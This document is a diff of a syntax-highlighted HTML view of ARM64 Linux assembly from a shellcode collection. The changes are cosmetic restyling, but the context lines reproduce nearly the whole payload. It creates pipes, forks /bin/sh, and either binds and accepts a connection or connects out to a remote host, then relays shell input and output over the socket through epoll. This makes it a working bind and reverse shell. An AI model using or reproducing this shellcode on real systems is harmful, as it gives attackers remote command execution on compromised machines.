@@ -5,7 +5,7 @@
 <title>/home/user/hub/shellcode/os/linux/arm64/sync.s.html</title>
 <meta name="Generator" content="Vim/8.0">
 <meta name="plugin-version" content="vim7.4_v2">
-<meta name="syntax" content="armv4">
+<meta name="syntax" content="arm">
 <meta name="settings" content="use_css,pre_wrap,no_foldcolumn,prevent_copy=">
 <meta name="colorscheme" content="none">
 <style type="text/css">
@@ -18,6 +18,7 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
 .Constant { color: #c00000; }
 .Identifier { color: #008080; }
 .Statement { color: #af5f00; }
+.Todo { color: #000000; background-color: #ffff00; padding-bottom: 1px; }
 .PreProc { color: #c000c0; }
 -->
 </style>
@@ -30,15 +31,15 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
 </head>
 <body>
 <pre id='vimCodeElement'>
- <span class="Comment">/**</span>
+<span class="Comment">/**</span>
 <span class="Comment">  Copyright © 2018 Odzhan. All Rights Reserved.</span>
 
-  <span class="Identifier">Redistribution</span> <span class="Statement">and</span> <span class="Identifier">use</span> <span class="Identifier">in</span> <span class="Identifier">source</span> <span class="Statement">and</span> <span class="Identifier">binary</span> <span class="Identifier">forms</span><span class="Statement">,</span> <span class="Identifier">with</span> <span class="Identifier">or</span> <span class="Identifier">without</span>
-  <span class="Identifier">modification</span><span class="Statement">,</span> <span class="Identifier">are</span> <span class="Identifier">permitted</span> <span class="Identifier">provided</span> <span class="Identifier">that</span> <span class="Identifier">the</span> <span class="Identifier">following</span> <span class="Identifier">conditions</span> <span class="Identifier">are</span>
-  <span class="Identifier">met:</span>
+<span class="Comment">  Redistribution and use in source and binary forms, with or without</span>
+<span class="Comment">  modification, are permitted provided that the following conditions are</span>
+<span class="Comment">  met:</span>
 
-  <span class="Constant">1.</span> <span class="Identifier">Redistributions</span> <span class="Identifier">of</span> <span class="Identifier">source</span> <span class="Identifier">code</span> <span class="Identifier">must</span> <span class="Identifier">retain</span> <span class="Identifier">the</span> <span class="Identifier">above</span> <span class="Identifier">copyright</span>
-  <span class="Identifier">notice</span><span class="Statement">,</span> <span class="Identifier">this</span> <span class="Identifier">list</span> <span class="Identifier">of</span> <span class="Identifier">conditions</span> <span class="Statement">and</span> <span class="Identifier">the</span> <span class="Identifier">following</span> <span class="Identifier">disclaimer.</span>
+<span class="Comment">  1. Redistributions of source code must retain the above copyright</span>
+<span class="Comment">  </span><span class="Todo">notice</span><span class="Comment">, this list of conditions and the following disclaimer.</span>
 
   <span class="Constant">2.</span> <span class="Identifier">Redistributions</span> <span class="Identifier">in</span> <span class="Identifier">binary</span> <span class="Identifier">form</span> <span class="Identifier">must</span> <span class="Identifier">reproduce</span> <span class="Identifier">the</span> <span class="Identifier">above</span> <span class="Identifier">copyright</span>
   <span class="Identifier">notice</span><span class="Statement">,</span> <span class="Identifier">this</span> <span class="Identifier">list</span> <span class="Identifier">of</span> <span class="Identifier">conditions</span> <span class="Statement">and</span> <span class="Identifier">the</span> <span class="Identifier">following</span> <span class="Identifier">disclaimer</span> <span class="Identifier">in</span> <span class="Identifier">the</span>
@@ -92,7 +93,7 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Identifier">s:</span>    <span class="PreProc">.skip</span> <span class="Constant">4</span>
 
     <span class="PreProc">.ifdef</span> <span class="Identifier">BIND</span>
-    <span class="Identifier">s2:</span>   <span class="PreProc">.skip</span> <span class="Constant">8</span>
+    <span class="Type">s2</span>:   <span class="PreProc">.skip</span> <span class="Constant">8</span>
     <span class="PreProc">.endif</span>
 
     <span class="Identifier">evts:</span> <span class="PreProc">.skip</span> <span class="Constant">16</span>
@@ -114,16 +115,16 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_pipe2</span>
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">xzr</span>
     <span class="Statement">add</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">p_in</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// create pipes for stdout + stderr</span>
     <span class="Comment">// pipe2(out, 0);</span>
     <span class="Statement">add</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">p_out</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// syscall(SYS_gettid);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_gettid</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
     <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">id</span>]
 
     <span class="Comment">// clone(CLONE_CHILD_SETTID   | </span>
@@ -134,9 +135,9 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x3</span><span class="Statement">,</span> <span class="Type">xzr</span>              <span class="Comment">// newtls</span>
     <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Type">xzr</span>              <span class="Comment">// ptid</span>
     <span class="Identifier">movl</span>    <span class="Type">x0</span><span class="Statement">,</span> (<span class="Identifier">CLONE_CHILD_SETTID</span> <span class="Statement">+</span> <span class="Identifier">CLONE_CHILD_CLEARTID</span> <span class="Statement">+</span> <span class="Identifier">SIGCHLD</span>)
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
     <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">id</span>]         <span class="Comment">// save id</span>
-    <span class="Identifier">cbnz</span>    <span class="Type">w0</span><span class="Statement">,</span> <span class="Identifier">opn_con</span>          <span class="Comment">// if already forked?</span>
+    <span class="Statement">cbnz</span>    <span class="Type">w0</span><span class="Statement">,</span> <span class="Identifier">opn_con</span>          <span class="Comment">// if already forked?</span>
                                  <span class="Comment">// open connection</span>
     <span class="Comment">// in this order..</span>
     <span class="Comment">//</span>
@@ -151,8 +152,8 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">subs</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">x1</span><span class="Statement">,</span> <span class="Constant">1</span>
     <span class="Comment">// w0 = (x1 == 0) ? in[0] : out[1];</span>
     <span class="Statement">csel</span>    <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w3</span><span class="Statement">,</span> <span class="Type">w4</span><span class="Statement">,</span> <span class="Statement">eq</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
-    <span class="Identifier">cbnz</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">c_dup</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">cbnz</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">c_dup</span>
 
     <span class="Comment">// close pipe handles in this order..</span>
     <span class="Comment">//</span>
@@ -165,30 +166,30 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
 <span class="Identifier">cls_pipe:</span>
     <span class="Statement">sub</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">x1</span><span class="Statement">,</span> <span class="Constant">4</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Type">x1</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
-    <span class="Identifier">cbnz</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">cls_pipe</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">cbnz</span>    <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">cls_pipe</span>
 
     <span class="Comment">// execve(&quot;/bin/sh&quot;, NULL, NULL);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_execve</span>
     <span class="Identifier">movq</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">BINSH</span>
     <span class="Statement">str</span>     <span class="Type">x0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Statement">-</span><span class="Constant">16</span>]<span class="Statement">!</span>
     <span class="Statement">mov</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">sp</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 <span class="Identifier">opn_con:</span>
     <span class="Comment">// close(in[0]);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">in0</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// close(out[1]);</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out1</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_socket</span>
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">SOCK_STREAM</span>
     <span class="Statement">mov</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">AF_INET</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Constant">16</span>      <span class="Comment">// x2 = sizeof(sin)</span>
     <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>] <span class="Comment">// w0 = s</span>
@@ -198,22 +199,22 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span>
     <span class="Comment">// bind (s, &amp;sa, sizeof(sa));</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_bind</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
     <span class="Statement">add</span>     <span class="Type">sp</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Constant">16</span>
-    <span class="Identifier">cbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_sck</span>  <span class="Comment">// if(x0 != 0) goto cls_sck</span>
+    <span class="Statement">cbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_sck</span>  <span class="Comment">// if(x0 != 0) goto cls_sck</span>
 
     <span class="Comment">// listen (s, 1);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_listen</span>
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Constant">1</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// accept (s, 0, 0);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_accept</span>
     <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Type">xzr</span>
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">xzr</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Statement">ldr</span>     <span class="Type">w1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]      <span class="Comment">// load binding socket</span>
     <span class="Statement">stp</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
@@ -224,13 +225,13 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span>
     <span class="Comment">// connect (s, &amp;sa, sizeof(sa));</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_connect</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
     <span class="Statement">add</span>     <span class="Type">sp</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Constant">16</span>
-    <span class="Identifier">cbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_sck</span>      <span class="Comment">// if(x0 != 0) goto cls_sck</span>
+    <span class="Statement">cbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_sck</span>      <span class="Comment">// if(x0 != 0) goto cls_sck</span>
 <span class="PreProc">.endif</span>
     <span class="Comment">// efd = epoll_create1(0);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_epoll_create1</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
     <span class="Statement">str</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
 
     <span class="Comment">// epoll_ctl(efd, EPOLL_CTL_ADD, fd, &amp;evts);</span>
@@ -242,7 +243,7 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">add</span>     <span class="Type">x3</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">evts</span>
     <span class="Statement">stp</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">x2</span><span class="Statement">,</span> [<span class="Type">x3</span>]
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
     <span class="Statement">cmp</span>     <span class="Type">w2</span><span class="Statement">,</span> <span class="Type">w4</span>
     <span class="Statement">mov</span>     <span class="Type">w2</span><span class="Statement">,</span> <span class="Type">w4</span>
     <span class="Statement">bne</span>     <span class="Identifier">poll_init</span>
@@ -255,14 +256,14 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Constant">1</span>                <span class="Comment">// maxevents = 1</span>
     <span class="Statement">add</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">evts</span>         <span class="Comment">// *events   = &amp;evts</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]        <span class="Comment">// epfd      = efd</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// if (r &lt; 0) break;</span>
-    <span class="Identifier">tbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Constant">31</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>
+    <span class="Statement">tbnz</span>    <span class="Type">x0</span><span class="Statement">,</span> <span class="Constant">31</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>
 
     <span class="Comment">// if (!(evts.events &amp; EPOLLIN)) break;</span>
     <span class="Statement">ldp</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Type">x1</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">evts</span>]
-    <span class="Identifier">tbz</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Constant">0</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>
+    <span class="Statement">tbz</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Constant">0</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>
 
     <span class="Statement">ldr</span>     <span class="Type">w3</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
     <span class="Statement">ldp</span>     <span class="Type">w5</span><span class="Statement">,</span> <span class="Type">w4</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">in1</span>]
@@ -279,8 +280,8 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_read</span>
     <span class="Statement">mov</span>     <span class="Type">x2</span><span class="Statement">,</span> <span class="Identifier">BUFSIZ</span>
     <span class="Statement">add</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">buf</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
-    <span class="Identifier">cbz</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">cbz</span>     <span class="Type">x0</span><span class="Statement">,</span> <span class="Identifier">cls_efd</span>
 
     <span class="Comment">// encrypt/decrypt buffer</span>
 
@@ -288,7 +289,7 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_write</span>
     <span class="Statement">mov</span>     <span class="Type">w2</span><span class="Statement">,</span> <span class="Type">w0</span>
     <span class="Statement">mov</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w3</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
     <span class="Statement">b</span>       <span class="Identifier">poll_wait</span>
 <span class="Identifier">cls_efd:</span>
     <span class="Comment">// epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);</span>
@@ -296,55 +297,55 @@ body { font-family: monospace; color: #000000; background-color: #ffffff; }
     <span class="Statement">mov</span>     <span class="Type">x3</span><span class="Statement">,</span> <span class="Type">xzr</span>
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">EPOLL_CTL_DEL</span>
     <span class="Statement">ldp</span>     <span class="Type">w0</span><span class="Statement">,</span> <span class="Type">w2</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);</span>
     <span class="Statement">ldr</span>     <span class="Type">w2</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out0</span>]
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// close(efd);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// shutdown(s, SHUT_RDWR);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_shutdown</span>
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">SHUT_RDWR</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 <span class="Identifier">cls_sck:</span>
     <span class="Comment">// close(s);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
 <span class="PreProc">.ifdef</span> <span class="Identifier">BIND</span>
     <span class="Comment">// close(s2);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
-    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s2</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Type">s2</span>]
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 <span class="PreProc">.endif</span>
     <span class="Comment">// kill(pid, SIGCHLD);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_kill</span>
     <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">SIGCHLD</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">id</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// close(in[1]);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">in1</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
     <span class="Comment">// close(out[0]);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
     <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out0</span>]
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 
 <span class="PreProc">.ifdef</span> <span class="Identifier">EXIT</span>
     <span class="Comment">// exit(0);</span>
     <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_exit</span>
-    <span class="Identifier">svc</span>     <span class="Constant">0</span>
+    <span class="Statement">svc</span>     <span class="Constant">0</span>
 <span class="PreProc">.else</span>
     <span class="Comment">// deallocate stack</span>
     <span class="Statement">add</span>     <span class="Type">sp</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> (<span class="Identifier">ds_tbl_size</span> <span class="Statement">&amp;</span> <span class="Statement">-</span><span class="Constant">16</span>) <span class="Statement">+</span> <span class="Constant">16</span>
